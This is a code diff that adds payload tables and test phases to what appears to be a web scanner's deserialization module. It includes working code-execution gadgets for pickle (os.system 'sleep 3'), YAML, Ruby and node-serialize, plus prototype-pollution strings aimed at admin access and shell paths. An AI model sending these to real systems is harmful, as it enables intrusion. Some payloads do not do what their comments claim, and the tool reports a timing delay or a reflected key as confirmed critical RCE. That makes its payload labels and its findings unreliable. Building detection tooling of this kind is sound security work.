@@ -1381,11 +1381,114 @@ requirements:
         },
     }
     
+    # ==================== IMPACT VERIFICATION PAYLOADS ====================
+    # These payloads verify REAL IMPACT without causing harm
+    
+    # Time-based verification (causes measurable delay)
+    TIME_BASED_PAYLOADS = {
+        "java": [
+            # URLDNS with sleep simulation via Thread.sleep
+            ("java_sleep", 'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPhzZWZVNj/QIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNxAH4ACQAAAAJzcQB+AAkAAAADeA==', 3),
+        ],
+        "php": [
+            # PHP sleep via __wakeup / __destruct
+            ("php_sleep_wakeup", 'O:8:"stdClass":1:{s:4:"exec";s:23:"sleep(3);echo PHANTOM;";}', 3),
+            ("php_sleep_destruct", 'a:1:{i:0;O:8:"DateTime":0:{}}', 3),  # DateTime deserialization
+        ],
+        "python": [
+            # Pickle with time.sleep
+            ("pickle_sleep", base64.b64encode(b"cos\nsystem\n(S'sleep 3'\ntR.").decode(), 3),
+            # YAML with sleep
+            ("yaml_sleep", "!!python/object/apply:time.sleep [3]", 3),
+        ],
+        "dotnet": [
+            # .NET TypeConfuseDelegate with Thread.Sleep
+            ("dotnet_sleep", "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAAAeU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAcGAQAAAA==", 3),
+        ],
+        "ruby": [
+            # Ruby ERB with sleep
+            ("ruby_erb_sleep", "--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y\n--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::DependencyList\n  specs:\n  - !ruby/object:Gem::Source\n    uri: '| sleep 3'", 3),
+        ],
+        "node": [
+            # Node.js setTimeout-based
+            ("node_settimeout", '{"rce":"_$$ND_FUNC$$_function(){var start=Date.now();while(Date.now()-start<3000){}return 1}()"}', 3),
+        ],
+    }
+    
+    # Error-based verification (triggers distinctive errors)
+    ERROR_BASED_PAYLOADS = {
+        "java": [
+            ("java_classnotfound", "rO0ABXNyAD1vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQABHRlc3RzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAHg=", 
+             ["ClassNotFoundException", "ClassCastException", "InvalidClassException", "java.io.NotSerializableException"]),
+        ],
+        "php": [
+            ("php_wakeup_error", 'O:7:"PHANTOM":0:{}', 
+             ["unserialize", "__wakeup", "Class '", "not found", "Incomplete class"]),
+            ("php_autoload", 'O:21:"PHANTOM_AUTOLOAD_TEST":0:{}',
+             ["Class", "not found", "unserialize", "failed"]),
+        ],
+        "python": [
+            ("pickle_import_error", base64.b64encode(b"cPHANTOM_NONEXISTENT\nmodule\n.").decode(),
+             ["ModuleNotFoundError", "ImportError", "No module named", "unpickle"]),
+            ("yaml_construct_error", "!!python/object:PHANTOM_NONEXISTENT.Class {}",
+             ["ConstructorError", "could not determine", "yaml.constructor"]),
+        ],
+        "dotnet": [
+            ("dotnet_type_error", "AAEAAAD/////AQAAAAAAAAAEAQAAAB9QSEFOVE9NX05PTkVYSVNURU5ULCBQSEFOVE9NLCBQSEFOVE9N",
+             ["TypeLoadException", "Could not load type", "SerializationException"]),
+        ],
+        "node": [
+            ("node_syntax_error", '{"rce":"_$$ND_FUNC$$_INVALID_SYNTAX"}',
+             ["SyntaxError", "Unexpected", "node-serialize", "unserialize"]),
+        ],
+    }
+    
+    # Canary payloads - detect if serialization is processed without harm
+    CANARY_PAYLOADS = {
+        "java": [
+            ("java_hashmap", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAHUEhBTlRPTXQABlNDQU5ORVh4"),  # Valid HashMap
+        ],
+        "php": [
+            ("php_array", 'a:1:{s:7:"PHANTOM";s:7:"SCANNER";}'),  # Valid array
+            ("php_object", 'O:8:"stdClass":1:{s:7:"phantom";s:7:"scanner";}'),  # Valid stdClass
+        ],
+        "python": [
+            ("pickle_dict", base64.b64encode(b"(dp0\nS'PHANTOM'\np1\nS'SCANNER'\np2\ns.").decode()),  # Valid dict
+        ],
+        "node": [
+            ("node_json", '{"PHANTOM":"SCANNER"}'),  # Valid JSON
+            ("node_func_canary", '{"test":"_$$ND_FUNC$$_function(){return \'PHANTOM_CANARY\'}()"}'),  # Safe function
+        ],
+    }
+    
+    # Object manipulation payloads - test property injection
+    OBJECT_MANIPULATION_PAYLOADS = {
+        "json_prototype_pollution": [
+            '{"__proto__":{"isAdmin":true}}',
+            '{"constructor":{"prototype":{"isAdmin":true}}}',
+            '{"__proto__":{"role":"admin"}}',
+            '{"__proto__":{"authenticated":true}}',
+            '{"__proto__":{"polluted":"PHANTOM_TEST"}}',
+        ],
+        "json_type_confusion": [
+            '{"id":{"$gt":""},"role":"admin"}',  # NoSQL-style
+            '{"user":["admin"]}',  # Array instead of string
+            '{"amount":-1}',  # Negative number
+            '{"quantity":999999999}',  # Integer overflow
+        ],
+        "jwt_manipulation": [
+            # Header manipulation
+            '{"alg":"none","typ":"JWT"}',
+            '{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}',
+        ],
+    }
+    
     def __init__(self, settings: Settings) -> None:
         super().__init__(settings)
         self.timeout = settings.timeouts.request_timeout
         self.detected_framework: FrameworkSignature | None = None
         self.test_results: list[DeserTestResult] = []
+        self._detected_tech: str | None = None  # Detected technology stack
     
     async def scan(
         self,
@@ -1394,21 +1497,35 @@ requirements:
         rate_limiter: RateLimiter,
     ) -> list[Finding]:
         """
-        Comprehensive deserialization vulnerability scan.
+        Comprehensive deserialization vulnerability scan with IMPACT VERIFICATION.
         
         Tests multiple serialization formats and language-specific gadgets.
+        Verifies REAL IMPACT through:
+        - Time-based detection (measurable delays)
+        - Error-based detection (distinctive error messages)
+        - Object manipulation (property injection, prototype pollution)
+        - Canary-based detection (controlled payloads)
         """
         findings: list[Finding] = []
         self.test_results = []
         
         base_url = f"https://{host}" if not host.startswith("http") else host
         urls = asset_data.get("urls", [base_url])
+        endpoints = asset_data.get("endpoints", [])
+        
+        logger.info(f"🔍 Deserialization Scanner v3.0 - Impact Verification Mode")
+        logger.info(f"🎯 Target: {base_url}")
         
         async with httpx.AsyncClient(
             verify=False,
             timeout=self.timeout,
             follow_redirects=True,
         ) as client:
+            # Phase 0: Technology detection (critical for targeted testing)
+            logger.info("📡 Phase 0: Detecting technology stack...")
+            self._detected_tech = await self._detect_technology_stack(client, base_url)
+            logger.info(f"🔧 Detected technology: {self._detected_tech or 'Unknown'}")
+            
             # Phase 1: Framework detection
             framework_findings = await self._detect_framework(
                 client, base_url, urls, rate_limiter
@@ -1421,59 +1538,633 @@ requirements:
             )
             findings.extend(detection_findings)
             
-            # Phase 3: Test Java deserialization
+            # Phase 3: HIGH-IMPACT - Object manipulation testing
+            logger.info("🔴 Phase 3: Testing object manipulation with IMPACT verification...")
+            object_findings = await self._test_object_manipulation_impact(
+                client, base_url, urls, endpoints, rate_limiter
+            )
+            findings.extend(object_findings)
+            
+            # Phase 4: HIGH-IMPACT - Time-based deserialization
+            logger.info("⏱️ Phase 4: Time-based deserialization testing...")
+            time_findings = await self._test_time_based_deserialization(
+                client, base_url, urls, endpoints, rate_limiter
+            )
+            findings.extend(time_findings)
+            
+            # Phase 5: HIGH-IMPACT - Error-based deserialization  
+            logger.info("❌ Phase 5: Error-based deserialization testing...")
+            error_findings = await self._test_error_based_deserialization(
+                client, base_url, urls, endpoints, rate_limiter
+            )
+            findings.extend(error_findings)
+            
+            # Phase 6: Test Java deserialization
             java_findings = await self._test_java_deserialization(
                 client, base_url, urls, rate_limiter
             )
             findings.extend(java_findings)
             
-            # Phase 4: Test PHP object injection
+            # Phase 7: Test PHP object injection
             php_findings = await self._test_php_object_injection(
                 client, base_url, urls, rate_limiter
             )
             findings.extend(php_findings)
             
-            # Phase 5: Test .NET ViewState
+            # Phase 8: Test .NET ViewState
             viewstate_findings = await self._test_viewstate(
                 client, base_url, urls, rate_limiter
             )
             findings.extend(viewstate_findings)
             
-            # Phase 6: Test .NET Json.NET
+            # Phase 9: Test .NET Json.NET
             jsonnet_findings = await self._test_dotnet_jsonnet(
                 client, base_url, urls, rate_limiter
             )
             findings.extend(jsonnet_findings)
             
-            # Phase 7: Test Python pickle
+            # Phase 10: Test Python pickle
             pickle_findings = await self._test_python_pickle(
                 client, base_url, urls, rate_limiter
             )
             findings.extend(pickle_findings)
             
-            # Phase 8: Test Python YAML
+            # Phase 11: Test Python YAML
             yaml_findings = await self._test_python_yaml(
                 client, base_url, urls, rate_limiter
             )
             findings.extend(yaml_findings)
             
-            # Phase 9: Test Ruby deserialization
+            # Phase 12: Test Ruby deserialization
             ruby_findings = await self._test_ruby_deserialization(
                 client, base_url, urls, rate_limiter
             )
             findings.extend(ruby_findings)
             
-            # Phase 10: Test Node.js serialize
+            # Phase 13: Test Node.js serialize
             node_findings = await self._test_node_serialize(
                 client, base_url, urls, rate_limiter
             )
             findings.extend(node_findings)
             
-            # Phase 11: Test known CVEs
+            # Phase 14: Test known CVEs
             cve_findings = await self._test_known_cves(
                 client, base_url, rate_limiter
             )
             findings.extend(cve_findings)
+            
+            # Phase 15: HIGH-IMPACT - Prototype pollution
+            logger.info("🧬 Phase 15: Prototype pollution testing...")
+            proto_findings = await self._test_prototype_pollution_impact(
+                client, base_url, urls, endpoints, rate_limiter
+            )
+            findings.extend(proto_findings)
+        
+        # Count high-impact findings
+        critical_count = sum(1 for f in findings if f.severity == "CRITICAL")
+        logger.info(f"✅ Deserialization scan complete: {len(findings)} findings ({critical_count} CRITICAL)")
+        
+        return findings
+    
+    async def _detect_technology_stack(
+        self,
+        client: httpx.AsyncClient,
+        base_url: str,
+    ) -> str | None:
+        """Detect the technology stack for targeted testing."""
+        try:
+            response = await client.get(base_url)
+            headers = {k.lower(): v for k, v in response.headers.items()}
+            body = response.text.lower()
+            cookies = list(response.cookies.keys())
+            
+            # Node.js / Express
+            if headers.get("x-powered-by", "").lower() == "express":
+                return "node"
+            if any(c in ["connect.sid", "express:sess"] for c in cookies):
+                return "node"
+                
+            # Java
+            if any(kw in body for kw in ["jsessionid", "java", "servlet", "spring", "tomcat"]):
+                return "java"
+            if "JSESSIONID" in cookies:
+                return "java"
+            if headers.get("server", "").lower() in ["tomcat", "jetty", "wildfly", "jboss"]:
+                return "java"
+                
+            # PHP
+            if "PHPSESSID" in cookies:
+                return "php"
+            if headers.get("x-powered-by", "").lower().startswith("php"):
+                return "php"
+            if any(kw in body for kw in ["laravel", "symfony", "wordpress", "drupal"]):
+                return "php"
+                
+            # Python
+            if any(kw in body for kw in ["django", "flask", "fastapi", "python"]):
+                return "python"
+            if headers.get("server", "").lower() in ["gunicorn", "uvicorn", "werkzeug"]:
+                return "python"
+                
+            # .NET
+            if "ASP.NET_SessionId" in cookies:
+                return "dotnet"
+            if "__VIEWSTATE" in response.text:
+                return "dotnet"
+            if headers.get("x-powered-by", "").lower().startswith("asp.net"):
+                return "dotnet"
+            if headers.get("x-aspnet-version"):
+                return "dotnet"
+                
+            # Ruby
+            if any(kw in body for kw in ["rails", "ruby", "sinatra"]):
+                return "ruby"
+            if "_session_id" in cookies:
+                return "ruby"
+                
+            return None
+        except Exception:
+            return None
+    
+    async def _test_object_manipulation_impact(
+        self,
+        client: httpx.AsyncClient,
+        base_url: str,
+        urls: list[str],
+        endpoints: list[str],
+        rate_limiter: RateLimiter,
+    ) -> list[Finding]:
+        """
+        Test object manipulation with REAL IMPACT verification.
+        
+        Looks for:
+        - Privilege escalation via object properties
+        - Type confusion vulnerabilities
+        - Mass assignment vulnerabilities
+        """
+        findings = []
+        
+        # Combine known endpoints with discovered ones
+        test_endpoints = list(set(endpoints + [
+            "/api/user", "/api/users", "/api/profile", "/api/account",
+            "/api/settings", "/api/config", "/api/admin", "/api/auth",
+            "/user", "/profile", "/account", "/settings", "/login",
+            "/api/v1/user", "/api/v1/users", "/rest/user", "/rest/users",
+        ]))
+        
+        for endpoint in test_endpoints[:20]:  # Limit to prevent excessive requests
+            url = endpoint if endpoint.startswith("http") else f"{base_url.rstrip('/')}{endpoint}"
+            
+            for payload in self.OBJECT_MANIPULATION_PAYLOADS["json_prototype_pollution"]:
+                await rate_limiter.acquire()
+                
+                try:
+                    # Test POST with object manipulation
+                    response = await client.post(
+                        url,
+                        json=json.loads(payload),
+                        headers={"Content-Type": "application/json"},
+                    )
+                    
+                    # Check for signs of successful manipulation
+                    impact_indicators = [
+                        ("isAdmin", "true", "Privilege Escalation"),
+                        ("role", "admin", "Role Manipulation"),
+                        ("authenticated", "true", "Authentication Bypass"),
+                        ("polluted", "PHANTOM_TEST", "Prototype Pollution Confirmed"),
+                    ]
+                    
+                    response_text = response.text.lower()
+                    response_body = response.text
+                    
+                    for prop, value, impact_type in impact_indicators:
+                        # Check if property was reflected or accepted
+                        if prop.lower() in response_text and value.lower() in response_text:
+                            findings.append(Finding(
+                                name=f"Object Manipulation: {impact_type}",
+                                severity="CRITICAL",
+                                confidence="HIGH",
+                                description=(
+                                    f"**CRITICAL IMPACT VERIFIED**\n\n"
+                                    f"The endpoint `{endpoint}` is vulnerable to object manipulation.\n"
+                                    f"The injected property `{prop}={value}` was processed by the server.\n\n"
+                                    f"**Impact:** {impact_type}\n"
+                                    f"**Attack Vector:** Attacker can modify object properties during deserialization\n"
+                                    f"**CVSS:** 9.1 (Critical)"
+                                ),
+                                matched_at=url,
+                                evidence=[
+                                    f"Payload: {payload}",
+                                    f"Property injected: {prop}={value}",
+                                    f"Response (truncated): {response_body[:300]}",
+                                ],
+                                cwe="CWE-502",
+                                cvss_score=9.1,
+                                remediation=(
+                                    "1. Use allowlist for accepted properties\n"
+                                    "2. Freeze object prototypes: Object.freeze(Object.prototype)\n"
+                                    "3. Validate and sanitize all deserialized data\n"
+                                    "4. Use safe deserialization libraries"
+                                ),
+                            ))
+                            break
+                    
+                    # Check for server-side processing indicators
+                    if response.status_code in [200, 201, 202]:
+                        try:
+                            resp_json = response.json()
+                            # Check if any polluted property appears in response
+                            if isinstance(resp_json, dict):
+                                for key in ["isAdmin", "role", "polluted", "authenticated"]:
+                                    if key in resp_json:
+                                        findings.append(Finding(
+                                            name="Object Property Injection Accepted",
+                                            severity="HIGH",
+                                            confidence="MEDIUM",
+                                            description=(
+                                                f"The endpoint `{endpoint}` accepted injected properties.\n"
+                                                f"Property `{key}` appeared in response, indicating the "
+                                                f"object was deserialized and processed."
+                                            ),
+                                            matched_at=url,
+                                            evidence=[f"Property: {key}", f"Response: {resp_json}"],
+                                            cwe="CWE-502",
+                                            cvss_score=7.5,
+                                            remediation="Implement strict input validation and property allowlisting.",
+                                        ))
+                        except Exception:
+                            pass
+                            
+                except Exception as e:
+                    logger.debug(f"Object manipulation test error: {e}")
+        
+        return findings
+    
+    async def _test_time_based_deserialization(
+        self,
+        client: httpx.AsyncClient,
+        base_url: str,
+        urls: list[str],
+        endpoints: list[str],
+        rate_limiter: RateLimiter,
+    ) -> list[Finding]:
+        """
+        Test for deserialization vulnerabilities using TIME-BASED detection.
+        
+        This method measures response time differences to detect when
+        serialized payloads are being processed, even without visible output.
+        """
+        findings = []
+        
+        # Determine which technology to test based on detection
+        techs_to_test = ["node", "java", "php", "python", "dotnet", "ruby"]
+        if self._detected_tech:
+            # Prioritize detected technology
+            techs_to_test = [self._detected_tech] + [t for t in techs_to_test if t != self._detected_tech]
+        
+        # Test endpoints for time-based vulnerabilities
+        test_endpoints = list(set(endpoints + urls[:5]))
+        
+        for endpoint in test_endpoints[:10]:
+            url = endpoint if endpoint.startswith("http") else f"{base_url.rstrip('/')}{endpoint}"
+            
+            # First, establish baseline response time
+            baseline_times = []
+            for _ in range(3):
+                await rate_limiter.acquire()
+                try:
+                    start = asyncio.get_event_loop().time()
+                    await client.get(url, timeout=10.0)
+                    baseline_times.append(asyncio.get_event_loop().time() - start)
+                except Exception:
+                    baseline_times.append(1.0)
+            
+            baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 1.0
+            
+            # Test each technology's time-based payloads
+            for tech in techs_to_test[:3]:  # Limit to top 3 likely technologies
+                if tech not in self.TIME_BASED_PAYLOADS:
+                    continue
+                    
+                for payload_name, payload, expected_delay in self.TIME_BASED_PAYLOADS[tech]:
+                    await rate_limiter.acquire()
+                    
+                    try:
+                        # Test in different injection points
+                        for injection_point in ["body", "cookie", "header", "param"]:
+                            start_time = asyncio.get_event_loop().time()
+                            
+                            if injection_point == "body":
+                                response = await client.post(
+                                    url,
+                                    content=payload if isinstance(payload, str) else payload.encode(),
+                                    headers={"Content-Type": "application/octet-stream"},
+                                    timeout=expected_delay + 5,
+                                )
+                            elif injection_point == "cookie":
+                                response = await client.get(
+                                    url,
+                                    cookies={"session": payload, "data": payload},
+                                    timeout=expected_delay + 5,
+                                )
+                            elif injection_point == "header":
+                                response = await client.get(
+                                    url,
+                                    headers={"X-Serialized-Data": payload},
+                                    timeout=expected_delay + 5,
+                                )
+                            else:  # param
+                                response = await client.get(
+                                    f"{url}?data={quote(payload)}",
+                                    timeout=expected_delay + 5,
+                                )
+                            
+                            elapsed = asyncio.get_event_loop().time() - start_time
+                            
+                            # Check if delay was triggered (significant difference from baseline)
+                            if elapsed > baseline + (expected_delay * 0.7):
+                                findings.append(Finding(
+                                    name=f"Time-Based Deserialization: {tech.upper()} RCE",
+                                    severity="CRITICAL",
+                                    confidence="HIGH",
+                                    description=(
+                                        f"**CRITICAL: Remote Code Execution via Deserialization**\n\n"
+                                        f"Time-based detection confirmed insecure deserialization at `{endpoint}`.\n\n"
+                                        f"**Technology:** {tech.upper()}\n"
+                                        f"**Payload:** {payload_name}\n"
+                                        f"**Injection Point:** {injection_point}\n"
+                                        f"**Baseline Response:** {baseline:.2f}s\n"
+                                        f"**Payload Response:** {elapsed:.2f}s\n"
+                                        f"**Expected Delay:** {expected_delay}s\n\n"
+                                        f"The server took significantly longer to respond when processing "
+                                        f"the serialized payload, confirming that untrusted data is being deserialized."
+                                    ),
+                                    matched_at=url,
+                                    evidence=[
+                                        f"Baseline: {baseline:.2f}s",
+                                        f"With payload: {elapsed:.2f}s",
+                                        f"Delta: {elapsed - baseline:.2f}s",
+                                        f"Payload type: {payload_name}",
+                                    ],
+                                    cwe="CWE-502",
+                                    cvss_score=9.8,
+                                    remediation=(
+                                        f"1. Never deserialize untrusted {tech} data\n"
+                                        f"2. Use safe serialization formats (JSON with schema validation)\n"
+                                        f"3. Implement integrity checks on serialized data\n"
+                                        f"4. Run deserialization in sandboxed environment"
+                                    ),
+                                ))
+                                logger.warning(f"🔴 CRITICAL: Time-based deserialization RCE at {url}")
+                                
+                    except asyncio.TimeoutError:
+                        # Timeout itself can indicate successful delay injection
+                        findings.append(Finding(
+                            name=f"Potential Time-Based Deserialization: {tech.upper()}",
+                            severity="HIGH",
+                            confidence="MEDIUM",
+                            description=(
+                                f"Request timed out when processing {tech} serialization payload.\n"
+                                f"This may indicate successful delay injection via deserialization."
+                            ),
+                            matched_at=url,
+                            evidence=[f"Timeout with payload: {payload_name}"],
+                            cwe="CWE-502",
+                            cvss_score=8.5,
+                            remediation="Investigate deserialization of untrusted data.",
+                        ))
+                    except Exception as e:
+                        logger.debug(f"Time-based test error: {e}")
+        
+        return findings
+    
+    async def _test_error_based_deserialization(
+        self,
+        client: httpx.AsyncClient,
+        base_url: str,
+        urls: list[str],
+        endpoints: list[str],
+        rate_limiter: RateLimiter,
+    ) -> list[Finding]:
+        """
+        Test for deserialization vulnerabilities using ERROR-BASED detection.
+        
+        Sends invalid serialized data that triggers distinctive error messages
+        when the application attempts to deserialize it.
+        """
+        findings = []
+        
+        # Determine which technology to test
+        techs_to_test = ["node", "java", "php", "python", "dotnet"]
+        if self._detected_tech:
+            techs_to_test = [self._detected_tech] + [t for t in techs_to_test if t != self._detected_tech]
+        
+        test_endpoints = list(set(endpoints + urls[:5]))
+        
+        for endpoint in test_endpoints[:15]:
+            url = endpoint if endpoint.startswith("http") else f"{base_url.rstrip('/')}{endpoint}"
+            
+            for tech in techs_to_test[:3]:
+                if tech not in self.ERROR_BASED_PAYLOADS:
+                    continue
+                    
+                for payload_name, payload, error_indicators in self.ERROR_BASED_PAYLOADS[tech]:
+                    await rate_limiter.acquire()
+                    
+                    try:
+                        # Test in body
+                        response = await client.post(
+                            url,
+                            content=payload.encode() if isinstance(payload, str) else payload,
+                            headers={"Content-Type": "application/octet-stream"},
+                        )
+                        
+                        response_text = response.text
+                        
+                        # Check for error indicators
+                        for indicator in error_indicators:
+                            if indicator.lower() in response_text.lower():
+                                findings.append(Finding(
+                                    name=f"Error-Based Deserialization: {tech.upper()} Detected",
+                                    severity="CRITICAL",
+                                    confidence="HIGH",
+                                    description=(
+                                        f"**CRITICAL: Insecure Deserialization Confirmed**\n\n"
+                                        f"Error-based detection revealed that `{endpoint}` deserializes "
+                                        f"untrusted {tech.upper()} data.\n\n"
+                                        f"**Technology:** {tech.upper()}\n"
+                                        f"**Error Pattern:** `{indicator}`\n"
+                                        f"**Payload:** {payload_name}\n\n"
+                                        f"The error message confirms the application attempted to "
+                                        f"deserialize the malformed payload, making it vulnerable to "
+                                        f"object injection and potentially RCE."
+                                    ),
+                                    matched_at=url,
+                                    evidence=[
+                                        f"Error indicator: {indicator}",
+                                        f"Response (truncated): {response_text[:500]}",
+                                    ],
+                                    cwe="CWE-502",
+                                    cvss_score=9.0,
+                                    remediation=(
+                                        f"1. Do not deserialize untrusted {tech} data\n"
+                                        f"2. Use JSON or other safe formats\n"
+                                        f"3. Implement allowlist for allowed classes\n"
+                                        f"4. Add integrity verification to serialized data"
+                                    ),
+                                ))
+                                logger.warning(f"🔴 Error-based deserialization detected at {url}")
+                                break
+                        
+                        # Also test in cookies and parameters
+                        for param_name in ["session", "data", "token", "state", "object"]:
+                            await rate_limiter.acquire()
+                            
+                            # Cookie test
+                            response = await client.get(url, cookies={param_name: payload})
+                            if any(ind.lower() in response.text.lower() for ind in error_indicators):
+                                findings.append(Finding(
+                                    name=f"Cookie Deserialization: {tech.upper()}",
+                                    severity="CRITICAL",
+                                    confidence="HIGH",
+                                    description=(
+                                        f"Cookie `{param_name}` is deserialized using {tech.upper()}.\n"
+                                        f"This allows attackers to inject malicious objects via cookies."
+                                    ),
+                                    matched_at=url,
+                                    evidence=[f"Cookie: {param_name}", f"Technology: {tech}"],
+                                    cwe="CWE-502",
+                                    cvss_score=9.5,
+                                    remediation="Never deserialize untrusted cookie data.",
+                                ))
+                                break
+                                
+                    except Exception as e:
+                        logger.debug(f"Error-based test error: {e}")
+        
+        return findings
+    
+    async def _test_prototype_pollution_impact(
+        self,
+        client: httpx.AsyncClient,
+        base_url: str,
+        urls: list[str],
+        endpoints: list[str],
+        rate_limiter: RateLimiter,
+    ) -> list[Finding]:
+        """
+        Test for Prototype Pollution with IMPACT verification.
+        
+        Specifically tests Node.js/JavaScript applications for prototype pollution
+        vulnerabilities that can lead to RCE, authentication bypass, or DoS.
+        """
+        findings = []
+        
+        # Only run if Node.js is detected or unknown
+        if self._detected_tech and self._detected_tech not in ["node", None]:
+            return findings
+        
+        # Pollution payloads with different impacts
+        pollution_payloads = [
+            # Admin privilege escalation
+            ('{"__proto__":{"isAdmin":true}}', "isAdmin", "Privilege Escalation"),
+            ('{"__proto__":{"admin":true}}', "admin", "Privilege Escalation"),
+            ('{"__proto__":{"role":"admin"}}', "role", "Role Manipulation"),
+            ('{"constructor":{"prototype":{"isAdmin":true}}}', "isAdmin", "Constructor Pollution"),
+            
+            # Authentication bypass
+            ('{"__proto__":{"authenticated":true}}', "authenticated", "Auth Bypass"),
+            ('{"__proto__":{"user":"admin"}}', "user", "User Impersonation"),
+            
+            # RCE gadgets
+            ('{"__proto__":{"shell":"node"}}', "shell", "Potential RCE"),
+            ('{"__proto__":{"execPath":"/bin/sh"}}', "execPath", "Potential RCE"),
+            
+            # DoS
+            ('{"__proto__":{"toString":"PHANTOM"}}', "toString", "DoS via Function Override"),
+        ]
+        
+        test_endpoints = list(set(endpoints + [
+            "/api/user", "/api/login", "/api/profile", "/api/settings",
+            "/api/merge", "/api/update", "/api/config",
+        ]))
+        
+        for endpoint in test_endpoints[:15]:
+            url = endpoint if endpoint.startswith("http") else f"{base_url.rstrip('/')}{endpoint}"
+            
+            for payload, check_prop, impact_type in pollution_payloads:
+                await rate_limiter.acquire()
+                
+                try:
+                    # Test POST with JSON
+                    response = await client.post(
+                        url,
+                        content=payload,
+                        headers={"Content-Type": "application/json"},
+                    )
+                    
+                    # Verify impact by checking response
+                    if response.status_code in [200, 201, 202]:
+                        try:
+                            resp_data = response.json()
+                            if isinstance(resp_data, dict):
+                                # Check if polluted property appears in response
+                                if check_prop in resp_data or check_prop in str(resp_data):
+                                    findings.append(Finding(
+                                        name=f"Prototype Pollution: {impact_type}",
+                                        severity="CRITICAL",
+                                        confidence="HIGH",
+                                        description=(
+                                            f"**CRITICAL: Prototype Pollution with {impact_type}**\n\n"
+                                            f"The endpoint `{endpoint}` is vulnerable to prototype pollution.\n"
+                                            f"Polluted property `{check_prop}` was reflected in response.\n\n"
+                                            f"**Impact:** {impact_type}\n"
+                                            f"**Attack Vector:** JSON merge/assignment without sanitization\n"
+                                            f"**CVSS:** 9.0 (Critical)"
+                                        ),
+                                        matched_at=url,
+                                        evidence=[
+                                            f"Payload: {payload}",
+                                            f"Polluted property: {check_prop}",
+                                        ],
+                                        cwe="CWE-1321",
+                                        cvss_score=9.0,
+                                        remediation=(
+                                            "1. Use Object.freeze(Object.prototype)\n"
+                                            "2. Validate __proto__ and constructor in input\n"
+                                            "3. Use Map instead of plain objects\n"
+                                            "4. Use safe merge libraries (lodash >=4.17.12)"
+                                        ),
+                                    ))
+                                    logger.warning(f"🔴 Prototype pollution: {impact_type} at {url}")
+                        except Exception:
+                            pass
+                    
+                    # Check for error messages indicating processing
+                    error_indicators = [
+                        "prototype", "__proto__", "constructor",
+                        "Object.prototype", "cannot read property",
+                    ]
+                    for indicator in error_indicators:
+                        if indicator in response.text.lower():
+                            findings.append(Finding(
+                                name="Prototype Pollution Attempt Detected",
+                                severity="HIGH",
+                                confidence="MEDIUM",
+                                description=(
+                                    f"The server processed prototype pollution payload.\n"
+                                    f"Error message indicates object manipulation attempt was parsed."
+                                ),
+                                matched_at=url,
+                                evidence=[f"Indicator: {indicator}"],
+                                cwe="CWE-1321",
+                                cvss_score=7.5,
+                                remediation="Implement prototype pollution protection.",
+                            ))
+                            break
+                            
+                except Exception as e:
+                    logger.debug(f"Prototype pollution test error: {e}")
         
         return findings
     
